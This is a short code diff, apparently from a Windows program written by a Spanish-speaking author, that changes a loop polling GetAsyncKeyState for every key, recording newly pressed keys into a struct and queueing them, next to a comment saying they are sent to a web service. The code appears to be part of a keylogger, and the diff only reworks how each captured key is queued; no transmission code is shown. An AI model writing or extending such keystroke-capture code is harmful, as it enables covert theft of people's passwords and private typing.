@@ -458,10 +458,10 @@ int main() {
 			if (GetAsyncKeyState(key) == -32767) {
 
 				if (TeclasPulsadas(key) == FALSE) {
+					//string temp_char_to_string(1, key);
 					str_key.key = key;
-					send_key->key = key;
-
-					Node* a = getNode(send_key);
+					
+					Node* a = getNode(&str_key);
 					Enqueue(QUEUE, a);
 
 					//Envío al web service
